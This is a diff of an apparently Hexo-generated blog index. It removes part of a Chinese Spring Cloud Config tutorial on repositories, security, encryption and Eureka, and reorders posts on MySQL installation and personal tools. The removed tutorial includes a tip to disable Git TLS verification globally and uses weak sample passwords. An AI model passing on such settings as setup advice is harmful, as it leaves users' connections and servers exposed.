-<p>spring:<br>  cloud:<br>    config:<br>      server:<br>        git:<br>          uri: <a href="https://github.com/spring-cloud-samples/config-repo">https://github.com/spring-cloud-samples/config-repo</a><br>          repos:<br>            development:<br>              pattern:<br>                - */development<br>                - */staging<br>              uri: <a href="https://github.com/development/config-repo">https://github.com/development/config-repo</a><br>            staging:<br>              pattern:<br>                - */qa<br>                - */production<br>              uri: <a href="https://github.com/staging/config-repo">https://github.com/staging/config-repo</a><br>2.1.3 搜索目录<br>当我们把配置文件存放在Git仓库中子目录中时，可以通过设置serch-path来指定该目录。同样，serch-path也支持上面的占位符。示例如下:</p>
-<p>spring.cloud.config.server.git.uri=<a href="https://github.com/spring-cloud-samples/config-repo">https://github.com/spring-cloud-samples/config-repo</a><br>spring.cloud.config.server.git.searchPaths=foo,bar*<br>这样系统就会自动搜索foo的子目录，以及以bar开头的文件夹中的子目录。</p>
-<p>2.1.4 SSH配置<br>如果你不想使用HTTPS和用户认证，也可以直接使用SSH，这时候我们只需要将ssh需要的keys存储在～/.ssh目录即可，并将所配置的uri指向SSH地址即可，如：<a href="mailto:&#103;&#105;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;">&#103;&#105;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;</a>:cd826/SpringcloudSamplesConfig。</p>
-<p>如果你清楚的知道你的~/.git目录，那么你可以使用git config –global来配置。否则可以使用全局配置，比如：git config –global http.sslVerify false。</p>
-<p>2.1.4 代理<br>Config-Server会使用JGit访问配置库，因此我们可以在~/.git/config下配置HTTPS所使用的代理，也可以使用JVM系统属性-Dhttps.proxyHost和-Dhttps.proxyPort来配置。</p>
-<p>2.1.5 本地缓存<br>当Config-Server从Git(或SVN)中获取了配置信息后，将会在本地的文件系统中存储一份。默认将存储在系统临时目录下，并且以config-repo-作为开头，在Linux系统中默认存储的目录为/tmp/config-repo-<randomid>。Config-Server将配置信息存储在本地可以有效的防止当Git仓库出现故障而无法访问的问题，当Config-Server无法访问到Git仓库时就会读取之前存储在本地文件中的配置，然后将这些配置信息返回给Config-Client。比如，当我们断开网络进行测试，当我们启动Config-Server时会在控制台中看到以下输出：</p>
-<p>17:18:01 285 [http-nio-8280-exec-1] WARN  o.s.c.c.s.e.MultipleJGitEnvironmentRepository - Could not fetch remote for master remote: <a href="https://github.com/cd826/SpringcloudSamplesConfig">https://github.com/cd826/SpringcloudSamplesConfig</a><br>17:18:01 660 [http-nio-8280-exec-1] INFO  o.s.c.a.AnnotationConfigApplicationContext - Refreshing<br>17:18:01 710 [http-nio-8280-exec-1] INFO  o.s.b.f.a.AutowiredAnnotationBeanPostProcessor - JSR-330 ‘javax.inject.Inject’ annotation found and supported for autowiring<br>17:18:01 782 [http-nio-8280-exec-1] INFO  o.s.c.c.s.e.NativeEnvironmentRepository - Adding property source: file:/Users/cd826/MyWork/springcloud-sample-projects/config/config-server/tmp/mallWeb-dev.properties<br>17:18:01 782 [http-nio-8280-exec-1] INFO  o.s.c.c.s.e.NativeEnvironmentRepository - Adding property source: file:/Users/cd826/MyWork/springcloud-sample-projects/config/config-server/tmp/mallWeb.properties<br>Spring Cloud 官方文档建议我们在Config-Server中指定本地文件路径，以避免出现不可预知的错误。可以使用下面的属性配置来指定本地文件路径:</p>
-<h2 id="Git仓库"><a href="#Git仓库" class="headerlink" title="Git仓库"></a>Git仓库</h2><p>spring.cloud.config.server.git.basedir=tmp/</p>
-<h2 id="SVN仓库"><a href="#SVN仓库" class="headerlink" title="SVN仓库"></a>SVN仓库</h2><p>spring.cloud.config.server.svn.basedir=tmp/<br>2.2 SVN配置<br>如果你的项目中使用的是SVN而不是Git，那么只需要在Config-Server中进行如下修改就可以支持SVN仓库。</p>
-<p>2.2.1 修改pom.xml<br>在pom文件中增加以下依赖:</p>
-<dependency>
-    <groupId>org.tmatesoft.svnkit</groupId>
-    <artifactId>svnkit</artifactId>
-</dependency>
-2.2.2 修改appliaction.properties
-spring.cloud.config.server.svn.uri={your svn server}
-spring.cloud.config.server.svn.username=username
-spring.cloud.config.server.svn.password=password
-2.3 文件系统
-如果你的Config-Server中不想使用Git或SVN，那么我们也可以直接从当前classpath或文件系统中加载相应的配置文件，只需在配置文件中设置如下：
-
-<p>spring.profiles.active=native<br>注意Config-Server默认会从classpath下加载，我们可以使用spring.cloud.config.server.native.searchLocations属性来设置配置文件的目录。对于文件路径，我们的配置必须以file:开头，如果是Windows系统对于绝对路径我们还得对/进行转义，比如，在Windows下我们需要配置如下：file:///${user.home}/config-repo。</p>
-<p>此外，当我们使用文件系统作为配置文件仓库时，spring.cloud.config.server.native.searchLocations的配置也是支持{application} 、{profile} 和 {label} 占位符的。</p>
-<p>Spring Cloud 官方还是推荐在测试和开发的时候可以使用文件系统，但是在正式环境中尽量还是使用Git或者SVN。</p>
-<p>另，Spring Cloud Config中还支持另外一种配置文件方式：Vault Server，这个后面有空我们再探讨。</p>
-<ol start="3">
-<li>安全保护</li>
-<li>1 Config-Server访问安全<br>对于我们存储在配置中心的一些配置内容，总会有一些是敏感信息，比如数据库连接的用户名和密码，你总不能直接裸奔吧，所以我们还是需要对Config-Server做一些安全控制。当然，对于Config-Server的安全控制有很多种，比如：物理网络限制、OAuth2授权等。但是，在这里因为我们使用的是SpringBoot，所以使用SpringSecurity会更容易也更简单。这时候，我们只需要在Config-Server中增加如下依赖:</li>
-</ol>
-<dependency>
-    <groupId>org.springframework.boot</groupId>
-    <artifactId>spring-boot-starter-security</artifactId>
-</dependency>
-此时，当我们启动Config-Server时，SpringSecurity会默认为我们生产一个访问密码，这种方式常常不是我们需要的，所以一般我们还需要在配置文件中配置用户名和密码，比如：
-
-<p>security.user.name=cd826<br>security.user.password=pwd<br>这样，当我们需要访问Config-Server时就会弹出用户认证对话框。此时，对于Config-Client我们需要在配置文件中增加用户和访问口令的配置，如下：</p>
-<p>spring.cloud.config.username=cd826<br>spring.cloud.config.password=pwd<br>3.2 加密与解密<br>访问安全是对整体的控制，多数情况下我们还需要对敏感内容加密后存储，比如之前所说的数据库访问的用户名称和登录口令。很幸运，Spring Cloud Config为我们提供相应的支持。</p>
-<p>Spring Cloud Config提供了两种加解密方式: 1)对称加密; 2)非对称加密。在描述如何使用之前，我们先看看一些使用前提。</p>
-<p>3.2.1 安装JCE(Java Cryptography Extension)<br>Spring Cloud Config所提供的加解密依赖JCE，因为，JDK中没有默认提供，所以我们需要先安装JCE。安装方法也比较简单，就是下载相应的Jar包，然后把这些包替换$JDK_HOME/jar/lib/security相应的文件，对于JDK8下载地址为:JCE for JDK8.</p>
-<p>3.2.2 加解密端点<br>另外，Spring Cloud Config还提供了两个端点进行加密和解密，如下：</p>
-<p>/encrypt: 加密端点，使用格式如下: curl $CONFIG_SERVER/encrypt -d 所要加密的内容<br>/decrypt: 解密端点，使用格式如下: curl $CONFIG_SERVER/decrypt -d 所要解密的内容<br>注意：当你测试中所加解密中包含特殊字符时，需要进行URL编码，这时候你需要使用–data-urlencode而不是-d.</p>
-<p>3.2.3 对称加密<br>对称加解密的配置非常简单。我们只需要在配置文件中增加加解密所使用的密钥即可，如:</p>
-<p>encrypt.key=cd826_key<br>配置好之后，你可以启动Config-Server，并使用上面所说的端点进行加解密测试。</p>
-<p>对于，配置文件我们需要为加密的内容增加一个{cipher}前导符。如：</p>
-<p>spring.datasource.username=dbuser<br>spring.datasource.password={cipher}FKSAJDFGYOS8F7GLHAKERGFHLSAJ<br>但是，如果你使用的配置文件是yml格式，那么需要使用单引号把加密内容引起来，如下：</p>
-<p>spring:<br>    datasource:<br>        username:dbuser<br>        password:’{cipher}FKSAJDFGYOS8F7GLHAKERGFHLSAJ’<br>3.2.4 非对称加密<br>非对称加密相对于对称加密来说复杂了一些，首先我们需要借助Java的keytool生成密钥对，然后创建Key Store并复制到服务器目录下。对于keytool的使用可以参考这里:《Spring Cloud入门教程(番外篇四): Keytool证书工具》。</p>
-<p>使用keytool生成Key Store，命令如下:<br>$ keytool -genkeypair -alias tsfjckey -keyalg RSA <br>  -dname “CN=Mall Web,OU=TwoStepsFromJava,O=Organization,L=city,S=province,C=china” \<br>  -keypass javatwostepsfrom -keystore server.jks -storepass twostepsfromjava<br>将所生成server.jks拷贝到项目的resources目录下(Config-Server)。</p>
-<p>修改配置文件:</p>
-<p>encrypt.key-store.location=server.jks<br>encrypt.key-store.alias=tsfjckey<br>encrypt.key-store.password=twostepsfromjava<br>encrypt.key-store.secret=javatwostepsfrom<br>非对称加密相对于对称加密来说配置也复杂，但安全性也会高很多。</p>
-<p>3.2.5 使用多个加密Key<br>也许，我们需要对不同的敏感信息使用不同的加密key，这时候我们的配置文件只需要按如下进行编写:</p>
-<p>foo.bar={cipher}{key:testkey}…<br>Config-Server在解密的时候就会尝试从配置文件中获取testkey的做为密钥。</p>
-<ol start="4">
-<li>高可用配置</li>
-<li>1 整合Eureka<br>看到这里，可能有些童鞋已经发现，我们在Config-Client中配置config.uri时使用的具体的地址，那么是否可以使用之前的Eureka呢？答案是肯定，我们可以把Config-Server和其它微服务一样作为一个服务基本单元。我们只需要进行如下修改即可。</li>
-</ol>
-<p>4.1.1 Config-Server改造<br>在pom.xml中增加如下依赖:</p>
-<dependency>
-    <groupId>org.springframework.cloud</groupId>
-    <artifactId>spring-cloud-starter-eureka</artifactId>
-</dependency>
-在配置文件中配置我们服务的名称，及之前我们所编写Eureka服务器的地址:
-
-<p>spring.application.name=config-server</p>
-<p>eureka.client.service-url.defaultZone=<a href="http://localhost:8260/eureka">http://localhost:8260/eureka</a><br>启动类:</p>
-<p>/**</p>
-<ul>
-<li><p>TwoStepsFromJava Cloud – Config Server</p>
-</li>
-<li></li>
-<li><p>@author CD826(<a href="mailto:&#67;&#x44;&#56;&#x32;&#54;&#68;&#111;&#110;&#103;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#67;&#x44;&#56;&#x32;&#54;&#68;&#111;&#110;&#103;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a>)</p>
-</li>
-<li><p>@since 1.0.0</p>
-</li>
-<li><p>/<br>@SpringBootApplication<br>@EnableConfigServer<br>@EnableDiscoveryClient<br>public class Application {</p>
-<p>  public static void main(String[] args) {</p>
-<pre><code>  SpringApplication.run(Application.class, args);
-</code></pre>
-<p>  }</p>
-</li>
-</ul>
-<p>}<br>增加@EnableDiscoveryClient注解。</p>
-<p>Ok，到这里为止，Config-Server修改已经完成。如果我们启动Config-Server就会在Eureka服务器上看到相应的服务注册。</p>
-<p>4.1.2 Config-Client改造<br>在pom.xml中增加如下依赖:</p>
-<dependency>
-    <groupId>org.springframework.cloud</groupId>
-    <artifactId>spring-cloud-starter-eureka</artifactId>
-</dependency>
-配置文件修改，注意这里的配置文件为:bootstrap.properties:
-
-<p>spring.application.name=mallWeb<br>spring.cloud.config.profile=dev</p>
-<p>eureka.client.service-url.defaultZone=<a href="http://localhost:8260/eureka">http://localhost:8260/eureka</a></p>
-<p>spring.cloud.config.discovery.enabled=true<br>spring.cloud.config.discovery.service-id=config-server<br>修改启动类:</p>
-<p>/**</p>
-<ul>
-<li><p>TwoStepsFromJava Cloud – Config Client Project</p>
-</li>
-<li></li>
-<li><p>@author CD826(<a href="mailto:&#x43;&#68;&#56;&#x32;&#54;&#68;&#x6f;&#110;&#x67;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#x6d;">&#x43;&#68;&#56;&#x32;&#54;&#68;&#x6f;&#110;&#x67;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#x6d;</a>)</p>
-</li>
-<li><p>@since 1.0.0</p>
-</li>
-<li><p>/<br>@EnableDiscoveryClient<br>@SpringBootApplication<br>public class Application {</p>
-<p>  public static void main(String[] args) {</p>
-<pre><code>  SpringApplication.run(Application.class, args);
-</code></pre>
-<p>  }</p>
-</li>
-</ul>
-<p>}</p>
-<p>这样就完成了从Eureka中获取Config-Server的服务信息。</p>
-<p>这里最重要的就是在配置中增加: spring.cloud.config.discovery.enabled=true，并将原来所配置的spring.cloud.config.uri，修改为spring.cloud.config.discovery.service-id。</p>
-<p>4.2 快速失败与响应<br>4.2.1 开启Config-Server启动加载<br>默认情况下，只有当客户端请求时服务端才会从配置的Git仓库中进行加载，我们可以通过设置clone-on-start，让服务端在启动时就会加载。</p>
-<p>spring.cloud.config.server.git.uri=<a href="https://git/common/config-repo.git">https://git/common/config-repo.git</a></p>
-<p>spring.cloud.config.server.git.repos.team-a.pattern=team-a-*<br>spring.cloud.config.server.git.repos.team-a.clone-on-start=true<br>spring.cloud.config.server.git.repos.team-a.uri=<a href="http://git/team-a/config-repo.git">http://git/team-a/config-repo.git</a></p>
-<p>spring.cloud.config.server.git.repos.team-b.pattern=team-b-*<br>spring.cloud.config.server.git.repos.team-b.clone-on-start=false<br>spring.cloud.config.server.git.repos.team-b.uri=<a href="http://git/team-b/config-repo.git">http://git/team-b/config-repo.git</a></p>
-<p>spring.cloud.config.server.git.repos.team-c.pattern=team-c-*<br>spring.cloud.config.server.git.repos.team-c.uri=<a href="http://git/team-a/config-repo.git">http://git/team-a/config-repo.git</a><br>上面的配置，对于team-a的则在Config-Server启动时就会加载相应的配置，而对于其它则不会。当然，我们可以通过设置spring.cloud.config.server.git.clone-on-start的值来进行全局配置。</p>
-<p>4.2.2 开启Config-Client快速失败<br>在一些情况下，我们希望启动一个服务时无法连接到服务端能够快速返回失败，那么可以通过下面的配置来设置:</p>
-<p>spring.cloud.config.fail-fast=true<br>4.2.3 设置Config-Client重试<br>如果在启动时Config-Server碰巧不可以使用，你还想后面再进行重试，那么我们开始开启Config-Client的重试机制。首先，我们需要配置：</p>
-<p>spring.cloud.config.fail-fast=true<br>然后，我们需要在我们的的依赖中增加：</p>
-<dependency>
-    <groupId>org.springframework.retry</groupId>
-    <artifactId>spring-retry</artifactId>
-</dependency>
-<dependency>
-    <groupId>org.springframework.boot</groupId>
-    <artifactId>spring-boot-starter-aop</artifactId>
-</dependency>
-这样，我们就可以为Config-Client开启了重试机制，当启动连接Config-Server失败时，Config-Client会继续尝试连接Config-Server，默认会尝试连接6次，时间间隔初始为1000毫秒，后面每次尝试连接会按照1.1倍数增加尝试连接时间的间隔，如果最后还不能够连接到Config-Server才会返回错误。我们可以通过在配置文件中复写spring.cloud.config.retry.*来进行相关配置。
-
-<p>如果你想全权控制重试机制，可以实现一个类型为:RetryOperationsInterceptor的类，并把bean的id设置为:configServerRetryInterceptor。</p>
-<p>4.3 动态刷新配置<br>Config-Client中提供了一个refresh端点来实现配置文件的刷新。要想使用该功能，我们需要在Config-Client的pom.xml文件中增加以下依赖:</p>
-<dependency>
-    <groupId>org.springframework.boot</groupId>
-    <artifactId>spring-boot-starter-actuator</artifactId>
-</dependency>
-这样，当修改配置文件并提交到Git仓库后，就可以使用:http://localhost:8080/refresh刷新本地的配置数据。
-
-<p>但是，最好的方式还是和Spring Cloud Bus进行整合，这样才能实现配置的自动分发，而不是需要手工去刷新配置。</p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
-        <tag>SpringCloud</tag>
-        <tag>配置中心</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用Github Pages创建个人博客</title>
-    <url>/2017/11/21/%E4%BD%BF%E7%94%A8Github%20Pages%E5%88%9B%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
+    <url>/2017/11/21/2017/11-21_%E4%BD%BF%E7%94%A8Github%20Pages%E5%88%9B%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<p>Hexo为一快速、简洁且高效的博客框架。<br>本文主要简单记录了通过Hexo，借助Github Pages搭建个人博客，并配置主题为NexT的过程，方便后续自己在新环境上重新部署。<br>也因此有些操作可能不够详尽，并且可能已经不是当下的最佳实践了，请谨慎阅读。</p>
 <span id="more"></span>
 
@@ -400,86 +97,8 @@ spring.cloud.config.server.svn.password=password
       </tags>
   </entry>
   <entry>
-    <title>Windows离线安装MySQL5.7.21</title>
-    <url>/2018/02/28/Windows%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85MySQL5-7-21/</url>
-    <content><![CDATA[<p>本文主要记录Windows环境下离线安装MySQL数据库过程。</p>
-<span id="more"></span>
-
-<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ul>
-<li>OS：Windows 7 64bit</li>
-<li>MySQL：5.7.21</li>
-</ul>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
-<li><a href="https://dev.mysql.com/downloads/mysql/5.7.html#downloads">官网</a>下载MySQL压缩文件，选择Windows (x86, 64-bit), ZIP Archive版本。             </li>
-<li>解压压缩文件到自定义安装目录，如D:\Program Files，解压之后的MySQL目录为D:\Program Files\mysql-5.7.21-winx64。      </li>
-<li>在MySQL目录下新建配置文件my.ini，文件内容如下：</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#########################################################</span><br><span class="line">[mysql] </span><br><span class="line"># MySQL客户端默认字符集 </span><br><span class="line">default-character-set=utf8 </span><br><span class="line">[mysqld] </span><br><span class="line"># mysqld服务端口 </span><br><span class="line">port = 3306 </span><br><span class="line"># MySQL安装目录，需要根据实际情况填写</span><br><span class="line">basedir=D:\Program Files\mysql-5.7.21-winx64            </span><br><span class="line"># MySQL数据库数据存放目录，需要根据实际情况填写</span><br><span class="line">datadir=D:\Program Files\mysql-5.7.21-winx64\data       </span><br><span class="line"># 允许最大连接数 </span><br><span class="line">max_connections=200 </span><br><span class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集 </span><br><span class="line">character-set-server=utf8 </span><br><span class="line"># 创建新表时将使用的默认存储引擎 </span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line">#########################################################</span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>新增环境变量MYSQL_HOME<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量名：MYSQL_HOME</span><br><span class="line">变量值：D:\Program Files\mysql-5.7.21-winx64</span><br></pre></td></tr></table></figure></li>
-<li>修改环境变量Path<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量名：Path</span><br><span class="line">变量值：在原有Path基础上新增;%MYSQL_HOME%\bin;</span><br></pre></td></tr></table></figure></li>
-<li>安装mysqld服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld install </span><br></pre></td></tr></table></figure></li>
-<li>生成data目录<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld --initialize-insecure --user=mysql       # MySQL 5.7.16后默认不提供data目录</span><br></pre></td></tr></table></figure></li>
-<li>启动mysqld服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br><span class="line">net stop mysql                                  # 需要关闭mysql服务时执行</span><br></pre></td></tr></table></figure></li>
-<li>登陆MySQL<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p                                # 首次登录需要设置密码</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Database</tag>
-        <tag>Manual</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>我的利器</title>
-    <url>/2018/10/28/%E6%88%91%E7%9A%84%E5%88%A9%E5%99%A8/</url>
-    <content><![CDATA[<p>一直都很喜欢 <strong><a href="http://liqi.io/creators/" title="利器">利器</a></strong> 这个项目，在这里分享一下我自己的利器吧。</p>
-<span id="more"></span>
-
-<h4 id="介绍一下你自己和所做的工作。"><a href="#介绍一下你自己和所做的工作。" class="headerlink" title="介绍一下你自己和所做的工作。"></a>介绍一下你自己和所做的工作。</h4><p>我希望能够在和别人做自我介绍的时候，可以说自己是一名软件研发工程师。</p>
-<h4 id="你都在使用哪些硬件？"><a href="#你都在使用哪些硬件？" class="headerlink" title="你都在使用哪些硬件？"></a>你都在使用哪些硬件？</h4><ul>
-<li><p>ThinkPad X1 Carbon 2018<br>公司配的电脑，我喜欢自己的生活中只有一台电脑，我不排斥工作和生活混在一起。</p>
-</li>
-<li><p>iPhone 5s<br>现在已经是2018年10月，我还在用iPhone 5s 16G。这是我的第二部手机，已经陪伴我5年多了，前段时间第二次换了电池。因为平时的重心都在电脑上，所以并不会感觉这部手机不够用。</p>
-</li>
-<li><p>FILCO忍者二代机械键盘<br>红轴，双模，无刻，唯一的遗憾是当初犹豫再三之后还是选了104键的版本。现在想想，无论是对于有限的桌面空间，还是为了方便携带，87键都是一个更好的选择。小键盘输入数字的确更加方便，但是我对这个的需求其实并没有当初想的那么强烈，尤其是在已经习惯了笔记本的布局之后。</p>
-</li>
-<li><p>Kindle Paperwhite<br>间歇性疯狂读书。</p>
-</li>
-<li><p>Sony运动耳机 (NW-WS414)<br>女朋友送的第一个生日礼物。</p>
-</li>
-</ul>
-<ul>
-<li>Raspberry Pi 3B<br>当初心心念念，现在因为找不到刚需使用场景而吃灰中。</li>
-</ul>
-<h4 id="软件呢？"><a href="#软件呢？" class="headerlink" title="软件呢？"></a>软件呢？</h4><ul>
-<li>Chrome</li>
-<li>cmder</li>
-<li>Notepad++</li>
-<li>SublimeText3</li>
-<li>VSCode</li>
-<li>IntelliJ IDEA</li>
-<li>SecureCRT</li>
-<li>Everything</li>
-<li>BeyondCompare</li>
-<li>Navicat Premium 12</li>
-<li>Bandizip</li>
-<li>Postman</li>
-<li>Shadowsocks</li>
-<li>SpeedPan</li>
-<li>FSCapture</li>
-</ul>
-<h4 id="你最理想的工作环境是什么？"><a href="#你最理想的工作环境是什么？" class="headerlink" title="你最理想的工作环境是什么？"></a>你最理想的工作环境是什么？</h4><p>曾经有一天，突然觉得美剧<Silicon Valley>中，Richard他们一起工作生活的那个House就是我最渴望的工作环境。<br><img src="/images/siliconvalley.jpg" alt="&quot;siliconvalley&quot;"></p>
-<h4 id="你平时获得工作灵感的方式有哪些？"><a href="#你平时获得工作灵感的方式有哪些？" class="headerlink" title="你平时获得工作灵感的方式有哪些？"></a>你平时获得工作灵感的方式有哪些？</h4><p>逛<a href="https://www.zhihu.com/">知乎</a>，<a href="https://www.v2ex.com/">V2EX</a>。有时候会觉得，可能我一直都未曾真正有过灵感。</p>
-<h4 id="推荐一件生活中的利器给大家。"><a href="#推荐一件生活中的利器给大家。" class="headerlink" title="推荐一件生活中的利器给大家。"></a>推荐一件生活中的利器给大家。</h4><p>身边越来越多的人开始切换到了Windows10，每次看到别人任务栏上不曾使却又存在着的搜索框，我就会在心里小小的“鄙视”一下这个人。<a href="https://jingyan.baidu.com/article/a378c960a7f625b32828303d.html"><strong>单击三次鼠标即可关闭</strong></a>，不要让它再占用你“寸土寸金”的任务栏啦！<br>还有将键盘上的CapsLock键映射为Ctrl键，相信我，世界从此不同。</p>
-]]></content>
-      <tags>
-        <tag>程序员的自我修养</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Raspberry Pi配置记录</title>
-    <url>/2018/02/12/Raspberry-Pi/</url>
+    <url>/2018/02/13/2018/02-13_Raspberry-Pi/</url>
     <content><![CDATA[<p>本文为Raspberry Pi配置记录。</p>
 <span id="more"></span>
 
@@ -579,8 +198,39 @@ spring.cloud.config.server.svn.password=password
       </tags>
   </entry>
   <entry>
+    <title>Windows离线安装MySQL5.7.21</title>
+    <url>/2018/02/28/2018/02-28_Windows%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85MySQL5-7-21/</url>
+    <content><![CDATA[<p>本文主要记录Windows环境下离线安装MySQL数据库过程。</p>
+<span id="more"></span>
+
+<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ul>
+<li>OS：Windows 7 64bit</li>
+<li>MySQL：5.7.21</li>
+</ul>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
+<li><a href="https://dev.mysql.com/downloads/mysql/5.7.html#downloads">官网</a>下载MySQL压缩文件，选择Windows (x86, 64-bit), ZIP Archive版本。             </li>
+<li>解压压缩文件到自定义安装目录，如D:\Program Files，解压之后的MySQL目录为D:\Program Files\mysql-5.7.21-winx64。      </li>
+<li>在MySQL目录下新建配置文件my.ini，文件内容如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#########################################################</span><br><span class="line">[mysql] </span><br><span class="line"># MySQL客户端默认字符集 </span><br><span class="line">default-character-set=utf8 </span><br><span class="line">[mysqld] </span><br><span class="line"># mysqld服务端口 </span><br><span class="line">port = 3306 </span><br><span class="line"># MySQL安装目录，需要根据实际情况填写</span><br><span class="line">basedir=D:\Program Files\mysql-5.7.21-winx64            </span><br><span class="line"># MySQL数据库数据存放目录，需要根据实际情况填写</span><br><span class="line">datadir=D:\Program Files\mysql-5.7.21-winx64\data       </span><br><span class="line"># 允许最大连接数 </span><br><span class="line">max_connections=200 </span><br><span class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集 </span><br><span class="line">character-set-server=utf8 </span><br><span class="line"># 创建新表时将使用的默认存储引擎 </span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line">#########################################################</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>新增环境变量MYSQL_HOME<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量名：MYSQL_HOME</span><br><span class="line">变量值：D:\Program Files\mysql-5.7.21-winx64</span><br></pre></td></tr></table></figure></li>
+<li>修改环境变量Path<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量名：Path</span><br><span class="line">变量值：在原有Path基础上新增;%MYSQL_HOME%\bin;</span><br></pre></td></tr></table></figure></li>
+<li>安装mysqld服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld install </span><br></pre></td></tr></table></figure></li>
+<li>生成data目录<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld --initialize-insecure --user=mysql       # MySQL 5.7.16后默认不提供data目录</span><br></pre></td></tr></table></figure></li>
+<li>启动mysqld服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br><span class="line">net stop mysql                                  # 需要关闭mysql服务时执行</span><br></pre></td></tr></table></figure></li>
+<li>登陆MySQL<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p                                # 首次登录需要设置密码</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Database</tag>
+        <tag>Manual</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>树莓派使用bypy实现百度网盘上传下载</title>
-    <url>/2018/03/19/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%AE%9E%E7%8E%B0%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/</url>
+    <url>/2018/03/19/2018/03-19_%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%AE%9E%E7%8E%B0%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/</url>
     <content><![CDATA[<p>bypy是百度网盘的Python客户端，本文主要记录在树莓派上使用bypy实现百度网盘上传下载配置过程。</p>
 <span id="more"></span>
 
@@ -607,8 +257,167 @@ spring.cloud.config.server.svn.password=password
       </tags>
   </entry>
   <entry>
+    <title>我的利器</title>
+    <url>/2018/10/28/2018/10-28_%E6%88%91%E7%9A%84%E5%88%A9%E5%99%A8/</url>
+    <content><![CDATA[<p>一直都很喜欢 <strong><a href="http://liqi.io/creators/" title="利器">利器</a></strong> 这个项目，在这里分享一下我自己的利器吧。</p>
+<span id="more"></span>
+
+<h4 id="介绍一下你自己和所做的工作。"><a href="#介绍一下你自己和所做的工作。" class="headerlink" title="介绍一下你自己和所做的工作。"></a>介绍一下你自己和所做的工作。</h4><p>我希望能够在和别人做自我介绍的时候，可以说自己是一名软件研发工程师。</p>
+<h4 id="你都在使用哪些硬件？"><a href="#你都在使用哪些硬件？" class="headerlink" title="你都在使用哪些硬件？"></a>你都在使用哪些硬件？</h4><ul>
+<li><p>ThinkPad X1 Carbon 2018<br>公司配的电脑，我喜欢自己的生活中只有一台电脑，我不排斥工作和生活混在一起。</p>
+</li>
+<li><p>iPhone 5s<br>现在已经是2018年10月，我还在用iPhone 5s 16G。这是我的第二部手机，已经陪伴我5年多了，前段时间第二次换了电池。因为平时的重心都在电脑上，所以并不会感觉这部手机不够用。</p>
+</li>
+<li><p>FILCO忍者二代机械键盘<br>红轴，双模，无刻，唯一的遗憾是当初犹豫再三之后还是选了104键的版本。现在想想，无论是对于有限的桌面空间，还是为了方便携带，87键都是一个更好的选择。小键盘输入数字的确更加方便，但是我对这个的需求其实并没有当初想的那么强烈，尤其是在已经习惯了笔记本的布局之后。</p>
+</li>
+<li><p>Kindle Paperwhite<br>间歇性疯狂读书。</p>
+</li>
+<li><p>Sony运动耳机 (NW-WS414)<br>女朋友送的第一个生日礼物。</p>
+</li>
+</ul>
+<ul>
+<li>Raspberry Pi 3B<br>当初心心念念，现在因为找不到刚需使用场景而吃灰中。</li>
+</ul>
+<h4 id="软件呢？"><a href="#软件呢？" class="headerlink" title="软件呢？"></a>软件呢？</h4><ul>
+<li>Chrome</li>
+<li>cmder</li>
+<li>Notepad++</li>
+<li>SublimeText3</li>
+<li>VSCode</li>
+<li>IntelliJ IDEA</li>
+<li>SecureCRT</li>
+<li>Everything</li>
